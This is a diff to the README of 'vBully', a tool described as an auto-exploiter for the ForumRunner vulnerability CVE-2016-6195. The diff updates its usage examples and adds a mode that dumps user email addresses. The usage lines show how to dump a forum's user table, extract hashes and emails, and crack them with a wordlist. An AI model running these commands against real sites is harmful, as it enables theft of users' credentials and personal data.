@@ -7,14 +7,15 @@ vBully is an auto-exploiter for the ForumRunner vulnerability (CVE-2016-6195). T
  vBully v.1.1.0
 
 Usage:
-vbully -u http://example.com -p -c -w rockyou.txt -o example
+vbully -u http://example.com/forums -c -w rockyou.txt -o example
+vbully -u http://example.com/forums -d 3 -o example
 
 -d    Dump Mode (Default: 2)
         [1] Enumerate Tables
         [2] Dump User Table
+        [3] Dump User Email Addresses
 
 -u    URL
--p    Parse results for user:hash:salt combinations
 -c    Crack hashes (must provide -w <wordlist>)
 -w    Specify wordlist (decompressed)
 -o    Write results to file (provide file base name)
